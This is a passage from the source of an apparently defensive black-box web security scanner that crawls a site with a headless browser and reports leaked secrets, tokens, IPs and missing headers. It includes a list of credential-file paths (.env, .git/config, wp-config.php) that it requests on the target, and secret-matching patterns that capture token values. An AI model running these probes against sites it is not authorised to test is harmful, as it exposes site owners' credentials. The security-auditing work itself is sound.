import chalk from 'chalk';
import ora from 'ora';
import inquirer from 'inquirer';
import puppeteer from 'puppeteer';
import { getViceDataDir } from './src/utils/paths.js';
import {
  ALL_MODULES,
  AVAILABLE_MODULES,
  DEFAULT_LIBRARY_MODULES,
  PASSIVE_MODULES,
  SPECIALIZED_MODULES,
} from './src/core/modules.js';
import { createScanMetrics } from './src/core/metrics.js';
import { classifyCorsPolicy } from './src/core/detectors/cors.js';
import { classifyCsrfEvidence, classifyStoredInputSurface } from './src/core/detectors/forms.js';
import { classifyHardeningSignal } from './src/core/detectors/hardening.js';
import { classifyPublicJson } from './src/core/detectors/public-json.js';
import { classifyAuthenticatedSupabaseRead, classifySupabaseRead, COMMON_SENSITIVE_TABLE_CANDIDATES, extractSupabaseTableCandidates, normalizeSupabaseSchemaTables } from './src/core/detectors/supabase.js';
import { classifySignupResponse } from './src/core/detectors/signup.js';
import { classifySupabaseJwt, extractAssignedSecretValue, isPlaceholderSecret, isPublicSupabaseAnonMatch, SECRET_PATTERNS } from './src/utils/patterns.js';
import { createHttpClient, safeFetch, withHttpClient } from './src/core/http-client.js';
import { mapWithConcurrency } from './src/core/concurrency.js';
import { boundedAdd, boundedPush } from './src/core/budget.js';
import { classifySetCookie, getSetCookieHeaders } from './src/core/detectors/cookies.js';
import { analyzeSourceMap } from './src/core/detectors/source-map.js';
import { classifyGraphqlAliasResponse, classifyGraphqlBatchResponse, classifyGraphqlDepthResponse } from './src/core/detectors/graphql.js';
import { classifyTlsAuthorization, classifyTlsPublicKey } from './src/core/detectors/tls.js';
import { classifyTimingSamples } from './src/core/detectors/timing.js';
import { classifyRateLimitEvidence } from './src/core/detectors/rate-limit.js';
import { analyzeJwt, findJwtCandidates } from './src/core/detectors/jwt.js';
import { summarizeCoverage } from './src/core/coverage.js';
import { escapeHtml } from './src/core/reporter/escape.js';
import { createScanContext, getScanContext, withScanContext } from './src/core/scan-context.js';
import { createScopePolicy } from './src/core/scope.js';
import { installScopedRequestInterception } from './src/core/browser-scope.js';
import { appendFinding } from './src/core/findings.js';
import { calculateScore as calculateCoreScore } from './src/core/score.js';
import { ENGINE_VERSION, RULESET_VERSION, SCORING_VERSION } from './src/core/version.js';
import { classifySensitiveFile } from './src/core/detectors/sensitive-file.js';
import { classifyHttpOnlySubdomain, classifyOpenService } from './src/core/detectors/open-service.js';
import { classifyDkimSearch } from './src/core/detectors/dns-email.js';
import { classifyWordpressSurface } from './src/core/detectors/wordpress.js';
import { createSupabaseCanary } from './src/core/canary.js';
import { classifyUnauthenticatedApiResponse, findMassAssignmentSurfaces } from './src/core/detectors/api-schema.js';
import { classifyTraceResponse } from './src/core/detectors/http-methods.js';
import { classifyWebSocketMessages, redactWebSocketUrl } from './src/core/detectors/websocket.js';
import { resolveFirstPartyApiEndpoint } from './src/core/detectors/api-endpoint.js';
import { auditAiRag } from './src/core/ai-rag/audit.js';
import { loadAiRagCliConfig } from './src/core/ai-rag/cli-config.js';

const DISCOVERY_BUDGETS = Object.freeze({
  scriptUrls: 150,
  scriptSources: 180,
  sourceCharacters: 2 * 1024 * 1024,
  apiEndpoints: 200,
  storageUrls: 100,
  bucketNames: 100,
  websocketUrls: 50,
  websocketActive: 12,
});

// ─────────────────────────────────────────────
// VICE - Vulnerability Inspector & Code Examiner
// Black-Box Security Auditor v3.0
// Webba Creative Technologies (c) 2026
// ─────────────────────────────────────────────

// Paths that, if reachable, indicate a misconfiguration or leak.
// robots.txt and sitemap.xml are intentionally PUBLIC and not included here -
// they're consumed for path-discovery in the crawl phase instead.
const SENSITIVE_PATHS = [
  '/.env', '/.env.local', '/.env.production', '/.env.development',
  '/.git/config', '/.git/HEAD',
  '/wp-config.php', '/config.json', '/package.json',
  '/.DS_Store',
  '/.htaccess', '/server.js', '/phpinfo.php',
];

const IP_PATTERN = /(?<!\d)(?:(?:25[0-5]|2[0-4]\d|1\d{2}|[1-9]\d|\d)\.){3}(?:25[0-5]|2[0-4]\d|1\d{2}|[1-9]\d|\d)(?::\d{2,5})?(?!\d)/g;

const SECURITY_HEADERS = [
  { name: 'Strict-Transport-Security', severity: 'MOYENNE' },
  // Content-Security-Policy handled by CSP Bypass module (Scenario 8) - avoids double counting
  // X-Frame-Options handled by Clickjacking module (Scenario 1) - avoids double counting
  { name: 'X-Content-Type-Options',    severity: 'MOYENNE' },
  { name: 'Referrer-Policy',           severity: 'FAIBLE' },
  { name: 'Permissions-Policy',        severity: 'FAIBLE' },
];

// Server header handled by Stack Detection module - avoids double counting
const LEAK_HEADERS = ['X-Powered-By', 'X-AspNet-Version', 'X-AspNetMvc-Version'];

const findings = [];
const discoveredIps = new Set();

// Authenticated crawl context (set from CLI flags by main()).
// Applied to Puppeteer pages so the crawl can follow links behind a login.
// Note: NOT applied to safeFetch - public-access tests must stay unauthenticated.
let AUTH_CONTEXT = null;

async function applyAuth(page, baseUrl) {
  const scanContext = getScanContext();
  const authContext = scanContext?.authContext || AUTH_CONTEXT;
  if (!authContext) return;
  try {
    if (Array.isArray(authContext.cookies) && authContext.cookies.length) {
      const url = baseUrl || 'http://localhost/';
      const cookies = authContext.cookies.map(c => ({ name: c.name, value: c.value, url }));
      await page.setCookie(...cookies);
    }
    if (!scanContext?.scope && authContext.headers && Object.keys(authContext.headers).length) {
      await page.setExtraHTTPHeaders(authContext.headers);
    }
  } catch {}
}

function parseAuthString(cookieStr, headerStr) {
  const ctx = { cookies: [], headers: {} };
  if (cookieStr) {
    for (const pair of String(cookieStr).split(';')) {
      const trimmed = pair.trim();
      const eq = trimmed.indexOf('=');
      if (eq > 0) {
        ctx.cookies.push({ name: trimmed.substring(0, eq).trim(), value: trimmed.substring(eq + 1).trim() });
      }
    }
  }
  if (headerStr) {
    for (const h of String(headerStr).split(/\n|\|/)) {
      const colon = h.indexOf(':');
      if (colon > 0) {
        const name = h.substring(0, colon).trim();
        const value = h.substring(colon + 1).trim();
        if (name && value) ctx.headers[name] = value;
      }
    }
  }
  return (ctx.cookies.length || Object.keys(ctx.headers).length) ? ctx : null;
}

function addFinding(severity, module, title, detail, recommendation, metadata = {}) {
  const target = getScanContext()?.findings || findings;
  appendFinding(target, { severity, module, title, detail, recommendation, ...metadata });
}

async function launchBrowser() {
  const context = getScanContext();
  if (context?.signal?.aborted) throw context.signal.reason || new Error('scan_cancelled');
  const args = ['--disable-dev-shm-usage'];
  if (process.env.VICE_DISABLE_CHROMIUM_SANDBOX === '1') {
    args.push('--no-sandbox', '--disable-setuid-sandbox');
  }
  const browser = await puppeteer.launch({ headless: true, args });
  if (context) {
    context.browsers.add(browser);
    if (context.signal) {
      context.signal.addEventListener('abort', () => {
        browser.close().catch(() => {});
      }, { once: true });
    }
  }
  return browser;
}

async function createBrowserPage(browser, baseUrl, options = {}) {
  const page = await browser.newPage();
  const context = getScanContext();
  if (context?.scope) {
    await installScopedRequestInterception(page, {
      scope: context.scope,
      signal: context.signal,
      metrics: context.browserMetrics,
      authHeaders: options.authenticated ? context.authContext?.headers : null,
    });
  }
  if (options.authenticated) await applyAuth(page, baseUrl);
  return page;
}

async function authorizeDiscoveredDestination(value) {
  const scope = getScanContext()?.scope;
  if (!scope) return true;
  try {
    if (scope.isHostAllowed(new URL(value).hostname)) {
      await scope.assertUrl(value, { reusePinned: true });
    } else {
      await scope.authorizeDiscoveredUrl(value, { reusePinned: true });
    }
    return true;
  } catch {
    return false;
  }
}

function severityColor(sev) {
  const map = { CRITIQUE: chalk.bgRed.white.bold, ELEVEE: chalk.red.bold, MOYENNE: chalk.yellow.bold, FAIBLE: chalk.blue, INFO: chalk.gray };
  return (map[sev] || chalk.white)(` ${sev} `);
}

// ──────────── MODULE 1 : Crawl & Extract JS (Puppeteer) ────────────

async function crawlAndExtract(baseUrl, spinner, options = {}) {
  const reportFindings = options.reportFindings !== false;
  spinner.text = 'Launching headless browser...';

  let browser;
  try {
    browser = await launchBrowser();
  } catch (err) {
    if (reportFindings) addFinding('CRITIQUE', 'Crawl', 'Unable to launch browser', err.message, 'Verify that Puppeteer/Chromium is properly installed');
    return { scripts: [], html: '', pageUrls: [] };
  }

  const page = await createBrowserPage(browser, baseUrl, { authenticated: true });
  await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');

  // Intercept all JS requests loaded by the browser
  const scriptUrls = new Set();
  const pendingScriptReads = new Set();
  const scriptContents = [];
  const addScriptSource = source => boundedPush(
    scriptContents,
    String(source || '').slice(0, DISCOVERY_BUDGETS.sourceCharacters),
    DISCOVERY_BUDGETS.scriptSources,
  );

  const captureScriptResponse = async (response) => {
    try {
      const url = response.url();
      const contentType = response.headers()['content-type'] || '';
      if (contentType.includes('javascript') || url.endsWith('.js')) {
        if (!scriptUrls.has(url) && boundedAdd(scriptUrls, url, DISCOVERY_BUDGETS.scriptUrls)) {
          const text = await response.text().catch(() => '');
          if (text.length > 10) {
            addScriptSource(text);
          }
        }
      }
    } catch {}
  };
  const drainScriptReads = async () => {
    while (pendingScriptReads.size > 0) {
      await Promise.allSettled([...pendingScriptReads]);
    }
  };
  page.on('response', (response) => {
    const task = captureScriptResponse(response);
    pendingScriptReads.add(task);
    task.finally(() => pendingScriptReads.delete(task));
  });

  // Navigate to the page
  spinner.text = 'Loading the page in the browser...';
  try {
    await page.goto(baseUrl, { waitUntil: 'networkidle2', timeout: 30000 });
  } catch (err) {
    if (reportFindings) addFinding('CRITIQUE', 'Crawl', 'Site unreachable', `Unable to load ${baseUrl}: ${err.message}`, 'Verify that the site is online');
    await browser.close();
    return { scripts: [], html: '', pageUrls: [] };
  }

  // Wait a bit for lazy-loaded scripts
  spinner.text = 'Waiting for dynamic scripts to load...';
  await new Promise(r => setTimeout(r, 3000));

  // Scroll to trigger lazy-loads
  spinner.text = 'Scrolling the page to trigger lazy-loads...';
  await page.evaluate(async () => {
    for (let i = 0; i < 5; i++) {
      window.scrollBy(0, window.innerHeight);
      await new Promise(r => setTimeout(r, 500));
    }
    window.scrollTo(0, 0);
  });
  await new Promise(r => setTimeout(r, 2000));
  await drainScriptReads();

  // Retrieve the fully rendered DOM
  spinner.text = 'Extracting the rendered DOM...';
  const html = (await page.content()).slice(0, DISCOVERY_BUDGETS.sourceCharacters);
  const domText = await page.evaluate(limit => document.documentElement.innerHTML.slice(0, limit), DISCOVERY_BUDGETS.sourceCharacters);
  addScriptSource(domText);

  // Retrieve inline scripts from the DOM
  const inlineScripts = await page.evaluate(() => {
    return [...document.querySelectorAll('script:not([src])')]
      .slice(0, 25)
      .map(s => s.textContent.slice(0, 512 * 1024))
      .filter(t => t && t.length > 10);
  });
  for (const inlineScript of inlineScripts) addScriptSource(inlineScript);

  // Browser response events are asynchronous and can otherwise finish after
  // the analysis starts. Fetch declared bundles deterministically as a fallback.
  const declaredScriptUrls = await page.evaluate(() => {
    return [...document.querySelectorAll('script[src], link[rel="modulepreload"][href]')]
      .map(element => element.src || element.href)
      .filter(Boolean)
      .sort();
  });
  for (const scriptUrl of declaredScriptUrls) {
    if (!scriptUrls.has(scriptUrl) && !boundedAdd(scriptUrls, scriptUrl, DISCOVERY_BUDGETS.scriptUrls)) continue;
    if (!await authorizeDiscoveredDestination(scriptUrl)) continue;
    const scriptResponse = await safeFetch(scriptUrl);
    if (!scriptResponse || scriptResponse.status !== 200) continue;
    const text = await scriptResponse.text().catch(() => '');
    if (text.length > 10) {
      addScriptSource(text);
    }
  }

  // ── Storage audit: localStorage / sessionStorage ──
  // Tokens kept here are accessible to any script on the page (XSS theft vector).
  spinner.text = 'Auditing localStorage / sessionStorage...';
  try {
    const storage = await page.evaluate(() => {
      const dump = (s) => {
        const out = {};
        for (let i = 0; i < Math.min(s.length, 100); i++) {
          const k = s.key(i);
          out[k] = s.getItem(k)?.slice(0, 50_000);
        }
        return out;
      };
      return { local: dump(localStorage), session: dump(sessionStorage) };
    });

    if (reportFindings) {
      for (const [where, items] of [['localStorage', storage.local], ['sessionStorage', storage.session]]) {
        for (const [key, value] of Object.entries(items || {})) {
          if (!value || typeof value !== 'string' || value.length < 20) continue;
          // JWT-shaped value
          const looksLikeJwt = /^eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$/.test(value);
          // Or key name suggests an auth token
          const tokenishKey = /token|jwt|access|refresh|bearer|auth|session|sid|api[_-]?key/i.test(key);
          if (!looksLikeJwt && !tokenishKey) continue;
          addFinding('ELEVEE', 'Storage Security',
            `Auth token in ${where}: "${key}"`,
            `Value: ${value.substring(0, 80)}${value.length > 80 ? '...' : ''}\nTokens kept in ${where} are readable by any script on the page. An XSS will exfiltrate them.`,
            'Store auth tokens in HttpOnly cookies set by the server. Cookies with HttpOnly + Secure + SameSite=Strict cannot be read by JS.');
        }
      }
    }
    // Add storage content to scripts for later secret-pattern matching
    addScriptSource('LOCALSTORAGE: ' + JSON.stringify(storage.local));
    addScriptSource('SESSIONSTORAGE: ' + JSON.stringify(storage.session));
  } catch {}

  // ── Subresource Integrity check on external scripts ──
  // Analytics/tracking CDNs can't realistically use SRI: they rotate their
  // bundle content (sometimes daily) and any pinned hash would break the
  // tag on the next deploy. Reported as information so users see them but they
  // don't get blamed for an impossible mitigation.
  const ANALYTICS_CDN_HOSTS = [
    'clarity.ms', 'googletagmanager.com', 'google-analytics.com', 'gtag',
    'hotjar.com', 'fullstory.com', 'segment.com', 'segment.io', 'amplitude.com',
    'mixpanel.com', 'intercom.io', 'crisp.chat', 'tawk.to', 'plausible.io',
    'matomo.cloud', 'fathom.com', 'usefathom.com', 'simpleanalyticscdn.com',
    'cdn.heapanalytics.com', 'static.heapanalytics.com', 'js.stripe.com',
    'connect.facebook.net', 'snap.licdn.com', 'sc-static.net', 'ads.linkedin.com',
    'static.ads-twitter.com', 'analytics.tiktok.com', 'cdn.cookielaw.org',
  ];
  if (reportFindings) {
    spinner.text = 'Checking Subresource Integrity (SRI) on external scripts...';
    try {
    const externalScripts = await page.evaluate((origin) => {
      return [...document.querySelectorAll('script[src]')].slice(0, 100).map(s => ({
        src: s.src,
        integrity: s.integrity || '',
      })).filter(s => {
        try { return new URL(s.src).origin !== origin; } catch { return false; }
      });
    }, new URL(baseUrl).origin);

    for (const script of externalScripts) {
      if (script.integrity) continue;
      let host = '';
      try { host = new URL(script.src).hostname; } catch {}
      const isAnalytics = ANALYTICS_CDN_HOSTS.some(d => host === d || host.endsWith('.' + d) || host.includes(d));

      if (isAnalytics) {
        addFinding('INFO', 'SRI',
          `Analytics script without integrity: ${script.src}`,
          'Tracking and analytics scripts rotate their bundle content frequently, so SRI cannot be applied in practice. Listed for visibility - verify you intend to load this third-party script and that it is required (privacy / GDPR / page weight).',
          'For analytics scripts, SRI is impractical. Mitigation alternatives: load via a tag manager you control, self-host the script, or use a strict CSP (script-src) that only allows known analytics domains.',
          { classification: 'informational', confidence: 'high' });
        continue;
      }

      addFinding(classifyHardeningSignal('missing-sri').severity, 'SRI',
        `External script without integrity: ${script.src}`,
        'If the CDN or third-party host is compromised, malicious code runs without warning. SRI lets the browser refuse altered files.',
        `Add integrity="sha384-..." to the <script> tag. Generate the hash with:\n  curl -s ${script.src} | openssl dgst -sha384 -binary | openssl base64 -A\nAlso add crossorigin="anonymous".`);
    }
    } catch {}
  }

  // ── Mixed content: HTTP resources on HTTPS page ──
  if (reportFindings && new URL(baseUrl).protocol === 'https:') {
    spinner.text = 'Checking for mixed content (HTTP on HTTPS page)...';
    try {
      const mixedResources = await page.evaluate(() => {
        const resources = [];
        document.querySelectorAll('script[src], link[href], img[src], iframe[src]').forEach(el => {
          const url = el.src || el.href;
          if (url && url.startsWith('http://') && !url.startsWith('http://localhost') && !url.startsWith('http://127.')) {
            resources.push({ tag: el.tagName.toLowerCase(), url });
          }
        });
        return resources;
      });

      if (mixedResources.length > 0) {
        const list = mixedResources.slice(0, 10).map(r => `<${r.tag}> ${r.url}`).join('\n');
        const sev = mixedResources.some(r => r.tag === 'script' || r.tag === 'iframe') ? 'ELEVEE' : 'MOYENNE';
        addFinding(sev, 'Mixed Content',
          `${mixedResources.length} HTTP resource(s) loaded on HTTPS page`,
          `${list}${mixedResources.length > 10 ? `\n...and ${mixedResources.length - 10} more` : ''}\nBrowsers block scripts/iframes loaded over HTTP from HTTPS pages, but passive resources (images) may still be downgraded.`,
          'Use https:// for all resource URLs, or use protocol-relative URLs (//cdn.example.com/file.js).');
      }
    } catch {}
  }

  // Extract internal links
  const pageUrls = await page.evaluate((origin) => {
    return [...document.querySelectorAll('a[href]')]
      .map(a => a.href)
      .filter(href => href.startsWith(origin))
      .slice(0, 200);
  }, new URL(baseUrl).origin);

  // Test source maps
  if (reportFindings) spinner.text = 'Checking source maps...';
  for (const scriptUrl of reportFindings ? scriptUrls : []) {
    if (!scriptUrl.endsWith('.js')) continue;
    const mapUrl = scriptUrl + '.map';
    const mapRes = await safeFetch(mapUrl);
    if (mapRes && mapRes.status === 200) {
      const sourceMap = analyzeSourceMap(await mapRes.text());
      if (!sourceMap) continue;
      const secretDetail = sourceMap.secretTypes.length > 0 ? `\nCredential types: ${sourceMap.secretTypes.join(', ')}` : '';
      const pathDetail = sourceMap.sensitiveSources.length > 0 ? `\nSensitive source paths: ${sourceMap.sensitiveSources.join(', ')}` : '';
      const title = sourceMap.kind === 'credentials'
        ? 'Source map exposes credential material'
        : sourceMap.kind === 'sensitive-sources'
          ? 'Source map embeds sensitive server sources'
          : 'Source map exposes client source metadata';
      addFinding(sourceMap.severity, 'Source Map', title, `${mapUrl}\n${sourceMap.sourceCount} source path(s), ${sourceMap.embeddedSourceCount} embedded source file(s).${secretDetail}${pathDetail}`, sourceMap.kind === 'credentials' ? 'Remove and rotate exposed credentials, then rebuild without secrets.' : 'Disable production source maps when source disclosure is not intended.');
    }
  }

  // Discover additional routes from robots.txt (often reveals admin/internal paths)
  const origin = new URL(baseUrl).origin;
  const discoveredPaths = new Set();
  spinner.text = 'Fetching robots.txt for path discovery...';
  try {
    const robotsRes = await safeFetch(`${origin}/robots.txt`);
    if (robotsRes && robotsRes.status === 200) {
      const robotsTxt = await robotsRes.text();
      // Parse Disallow + Allow + Sitemap entries
      for (const line of robotsTxt.split('\n')) {
        const dm = line.match(/^\s*(?:Disallow|Allow):\s*(\S+)/i);
        if (dm) {
          const p = dm[1].trim();
          if (p && p !== '/' && !p.startsWith('#')) boundedAdd(discoveredPaths, p, 100);
        }
      }
    }
  } catch {}

  // Sitemap.xml: extract <loc> URLs
  spinner.text = 'Fetching sitemap.xml for path discovery...';
  try {
    const sitemapRes = await safeFetch(`${origin}/sitemap.xml`);
    if (sitemapRes && sitemapRes.status === 200) {
      const sitemapTxt = await sitemapRes.text();
      const locs = [...sitemapTxt.matchAll(/<loc>\s*([^<\s]+)\s*<\/loc>/gi)].map(m => m[1]);
      for (const loc of locs) {
        try {
          const u = new URL(loc);
          if (u.origin === origin && u.pathname && u.pathname !== '/') {
            boundedAdd(discoveredPaths, u.pathname, 100);
          }
        } catch {}
      }
    }
  } catch {}

  // Crawl a few internal pages for more coverage:
  // 1) sub-pages found in <a> links
  // 2) paths discovered from robots.txt / sitemap.xml
  const linkPages = [...new Set(pageUrls)].slice(0, 5);
  const robotsPages = [...discoveredPaths].slice(0, 5).map(p => origin + (p.startsWith('/') ? p : '/' + p));
  const subPages = [...new Set([...linkPages, ...robotsPages])];
  if (subPages.length > 0) {
    spinner.text = `Crawling ${subPages.length} internal pages...`;
    for (const subUrl of subPages) {
      try {
        await page.goto(subUrl, { waitUntil: 'networkidle2', timeout: 15000 });
        await new Promise(r => setTimeout(r, 2000));
        const subDom = await page.evaluate(limit => document.documentElement.innerHTML.slice(0, limit), DISCOVERY_BUDGETS.sourceCharacters);
        addScriptSource(subDom);
      } catch {}
    }
  }
  await drainScriptReads();

  spinner.text = `${scriptContents.length} sources retrieved (JS + DOM)...`;
  await browser.close();

  return { scripts: scriptContents, html, pageUrls };
}

// ──────────── MODULE 2 : JS Analysis ────────────

function analyzeScripts(jsContents, spinner) {
  spinner.text = 'Analyzing secrets in JS files...';
  const found = new Map();

  // Track already seen JWTs to avoid anon/service_role duplicates
  const seenJwts = new Set();
  const analyzedJwts = new Set();
  // Track values matched by specific (non-Generic) secret patterns so the
  // Generic API Key / Generic Secret patterns don't double-flag the same value.
  // For example, a Firebase key "AIzaSy..." should not also fire as Generic
  // API Key just because it sits next to `apiKey:`.
  const specificMatches = new Set();

  for (const js of jsContents) {
    for (const token of findJwtCandidates(js)) {
      if (analyzedJwts.has(token)) continue;
      analyzedJwts.add(token);
      const analysis = analyzeJwt(token);
      for (const signal of analysis?.signals || []) {
        addFinding(
          signal.severity,
          'Secrets',
          signal.title,
          signal.detail,
          signal.recommendation,
          { classification: signal.classification, confidence: signal.confidence },
        );
      }
    }

    for (const pattern of SECRET_PATTERNS) {
      const matches = js.match(pattern.regex);
      if (matches) {
        for (const match of matches) {
          // Filter out placeholders, examples, and false positives
          if (isPlaceholderSecret(match)) continue;
          if (pattern.validate && !pattern.validate(match)) continue;
          if (/Bearer\s+(xxx|token|your|example|wbt_xxx|test)/i.test(match)) continue;

          const matchIndex = js.indexOf(match);
          if (isPublicSupabaseAnonMatch(js, match, matchIndex)) continue;

          // Filter out environment variable references (not actual secrets)
          if (/process\.env\.|import\.meta\.env\.|os\.environ|getenv\(|ENV\[|System\.getenv/i.test(match)) continue;

          // For Generic patterns, several context-based filters
          if (pattern.name === 'Generic API Key' || pattern.name === 'Generic Secret') {
            // 1. Skip if surrounded by an env-var reference
            if (matchIndex !== -1) {
              const context = js.substring(Math.max(0, matchIndex - 50), matchIndex + match.length + 50);
              if (/process\.env|import\.meta\.env|os\.environ|getenv|ENV\[|System\.getenv|config\[|Config\./i.test(context)) continue;
            }
            // 2. Skip if the captured value looks like an identifier (snake_case,
            //    camelCase, kebab-case) rather than a high-entropy secret.
            //    Real secrets have mixed alphanumerics and special chars; names
            //    like "fetch_client_secret" or "stripeWebhookKey" are variables.
            const valueMatch = match.match(/["']([a-zA-Z0-9_\-!@#$%^&*]{8,})["']?$|[\s:=]([a-zA-Z0-9_\-]{16,})$/);
            const value = valueMatch ? (valueMatch[1] || valueMatch[2] || '') : '';
            if (value) {
              const looksLikeIdentifier = /^[a-z]+(?:[_-][a-z]+){1,}$|^[a-z]+(?:[A-Z][a-z]+){1,}$/.test(value);
              if (looksLikeIdentifier) continue;
              // 3. Skip if value is too low-entropy (no digit, no mixed case)
              const hasDigit = /\d/.test(value);
              const hasUpper = /[A-Z]/.test(value);
              const hasLower = /[a-z]/.test(value);
              if (!hasDigit && !(hasUpper && hasLower)) continue;
            }
          }

          // Skip if the same value already matched a more specific pattern.
          // A Firebase key (AIzaSy...) or Stripe key (sk_live_...) shouldn't
          // also fire as Generic API Key. The specific match string is shorter
          // (just the key) and the Generic one wraps it with "apiKey:..." etc,
          // so we check by substring.
          if (pattern.name === 'Generic API Key' || pattern.name === 'Generic Secret') {
            const value = extractAssignedSecretValue(match);
            let alreadyDetected = false;
            for (const known of specificMatches) {
              if (known.length >= 16 && (value === known || match.includes(known) || known.includes(value))) { alreadyDetected = true; break; }
            }
            if (alreadyDetected) continue;
          }

          // JWT deduplication (same anon key detected as service_role)
          if (pattern.name.includes('Supabase') && match.startsWith('eyJ')) {
            if (seenJwts.has(match)) continue;
            seenJwts.add(match);

            // Decode the JWT to determine the actual role
            try {
              const payload = JSON.parse(Buffer.from(match.split('.')[1], 'base64url').toString());
              if (payload.role === 'service_role') {
                addFinding('CRITIQUE', 'Secrets', 'Supabase Service Role Key detected', `Value: ${match}\nRole: service_role - this key grants FULL access to the database, bypasses all RLS`, 'IMMEDIATELY remove this key from client code. Keep it server-side only.');
              }
              continue;
            } catch {}
          }

          const key = `${pattern.name}::${match.substring(0, 60)}`;
          if (!found.has(key)) {
            found.set(key, true);
            // Record this match so subsequent Generic patterns can dedup against it
            if (pattern.name !== 'Generic API Key' && pattern.name !== 'Generic Secret') {
              specificMatches.add(extractAssignedSecretValue(match));
            }
            let sev = 'ELEVEE';
            if (pattern.name.includes('Private') || pattern.name === 'Stripe Secret Key' || pattern.name === 'AWS Secret Key') {
              sev = 'CRITIQUE';
            } else if (pattern.name.includes('Publishable') || pattern.name === 'Firebase API Key' || pattern.name === 'Google OAuth') {
              sev = 'FAIBLE';
            } else if (pattern.name === 'Generic API Key' || pattern.name === 'Generic Secret') {
              sev = 'MOYENNE';
            }

            const recoMap = {
              'Firebase API Key': 'The Firebase key is public by design, but verify Firebase security rules',
              'Stripe Publishable Key': 'The publishable key is designed to be public. Verify that the SECRET key is not exposed.',
              'Google OAuth': 'The OAuth client ID is public by design. Verify that the secret is not exposed.',
              'Discord Webhook': 'Remove the webhook URL from client code, recreate the webhook, and keep its token server-side.',
            };
            const reco = recoMap[pattern.name] || 'Move this value to server-side environment variables, never expose secrets in the client bundle';

            addFinding(sev, 'Secrets', `${pattern.name} detected`, `Value: ${match}`, reco);
          }
        }
      }
    }
  }

  // IP search
  spinner.text = 'Searching for exposed IP addresses...';
  const ipFound = new Set();
  for (const js of jsContents) {
    const matches = js.match(IP_PATTERN);
    if (matches) {
      for (const ip of matches) {
        const ipBase = ip.split(':')[0]; // Remove port if present
        const octets = ipBase.split('.').map(Number);

        // Ignore private IPs, localhost, link-local
        if (octets[0] === 127) continue;
        if (octets[0] === 0) continue;
        if (octets[0] === 10) continue;
        if (octets[0] === 172 && octets[1] >= 16 && octets[1] <= 31) continue;
        if (octets[0] === 192 && octets[1] === 168) continue;
        if (octets[0] === 169 && octets[1] === 254) continue;

        // Ignore IPs that look like version numbers
        if (/^\d+\.\d+\.\d+$/.test(ip)) continue;

        // Filter out sequences that match the IP shape but are clearly not IPs:
        // - all 4 octets small (< 50) is typical of versions, hashes, IDs, coords
        // - 3+ octets < 30 is too suspicious to call an IP
        const maxOctet = Math.max(...octets);
        if (maxOctet < 50) continue;
        const smallOctets = octets.filter(o => o < 30).length;
        if (smallOctets >= 3) continue;

        // Require a network context (URL, host, connect, fetch, etc.) to emit a finding.
        // Without context the match is almost certainly a coincidence on a numeric ID.
        const ipEscaped = ipBase.replace(/\./g, '\\.');
        const contextRegex = new RegExp(`(?:https?://|host|url|server|api|endpoint|connect|fetch|proxy|backend|ws://|wss://|ip|address|remote)[^\\n]{0,30}${ipEscaped}|${ipEscaped}[^\\n]{0,10}(?::\\d{2,5})`, 'i');
        const hasNetworkContext = contextRegex.test(js);
        if (!hasNetworkContext) continue;

        if (!ipFound.has(ip)) {
          ipFound.add(ip);
          (getScanContext()?.discoveredIps || discoveredIps).add(ipBase);
          addFinding(
            'INFO',
            'Exposed IP',
            'Public IP address referenced in client code',
            `IP found in a network context: ${ip}`,
            'Confirm that this public address is intentionally exposed.',
            { classification: 'confirmed', confidence: 'high', rule_id: 'vice/discovery/public-ip-reference' },
          );
        }
      }
    }
  }

  // Search for internal API endpoints
  spinner.text = 'Searching for API endpoints...';
  const apiPatterns = /(?:https?:\/\/[^\s"'`]+\/api\/[^\s"'`]*|\/api\/[a-zA-Z0-9\/_-]+)/g;
  const apiFound = new Set();
  for (const js of jsContents) {
    const matches = js.match(apiPatterns);
    if (matches) {
      for (const api of matches) {
        if (api.length < 8 || api.length > 200) continue;
        if (!isUsableApiEndpoint(api)) continue;
        if (!apiFound.has(api)) {
          apiFound.add(api);
        }
      }
    }
  }
  if (apiFound.size > 0) {
    addFinding('INFO', 'API Endpoints', `${apiFound.size} API endpoint(s) detected`, [...apiFound].slice(0, 15).join('\n'), 'Verify that each endpoint requires appropriate authentication');
  }
}

// Filter out URLs that look like documentation, anchors, template literals,
// or otherwise non-callable. Used by both the JS analysis and the API audit
// modules to avoid testing third-party doc pages and unresolved templates.
function isUsableApiEndpoint(url) {
  // Anchor URLs (documentation links with #section)
  if (url.includes('#')) return false;
  // Unresolved template literals like {prefix}, ${var}, <slug>
  if (/\{[a-zA-Z_][a-zA-Z0-9_]*\}|\$\{|\<[a-z_]+\>/.test(url)) return false;
  // Documentation paths: /docs/, /documentation/, /reference/, /api-docs/, /swagger/
  if (/\/docs?\/|\/documentation\/|\/reference\/|\/api-docs?\b|\/swagger(?:-ui)?\b/i.test(url)) return false;
  // Known documentation domains - we don't want to extract their /api/ examples
  const docHosts = ['docs.stripe.com', 'stripe.com', 'developer.mozilla.org', 'developer.apple.com', 'developers.google.com', 'cloud.google.com', 'docs.aws.amazon.com', 'docs.github.com', 'docs.microsoft.com', 'learn.microsoft.com', 'api.slack.com', 'docs.cleavr.io'];
  try {
    const u = new URL(url, 'http://x');
    if (u.hostname && docHosts.some(h => u.hostname === h || u.hostname.endsWith('.' + h))) return false;
  } catch {}
  return true;
}

// ──────────── MODULE 3 : Sensitive Files ────────────

async function checkSensitivePaths(baseUrl, spinner) {
  spinner.text = 'Checking for exposed sensitive files...';

  // First, get the size of the homepage and a fake 404 page for comparison
  const homeRes = await safeFetch(baseUrl);
  const homeSize = homeRes ? (await homeRes.text()).length : 0;
  const homeType = homeRes?.headers.get('content-type')?.split(';', 1)[0].trim().toLowerCase() || '';
  const fakeRes = await safeFetch(baseUrl.replace(/\/+$/, '') + '/vice-fake-path-that-does-not-exist-' + Date.now());
  const fakeSize = fakeRes ? (await fakeRes.text()).length : 0;
  const fakeType = fakeRes?.headers.get('content-type')?.split(';', 1)[0].trim().toLowerCase() || '';
  const fakeIsCatchAll = fakeRes?.status === 200;

  const checks = await mapWithConcurrency(SENSITIVE_PATHS, 6, async (path, index) => {
    spinner.text = `Sensitive files [${index + 1}/${SENSITIVE_PATHS.length}] ${path}`;
    const url = baseUrl.replace(/\/+$/, '') + path;
    const res = await safeFetch(url);
    if (!res || res.status !== 200) return null;

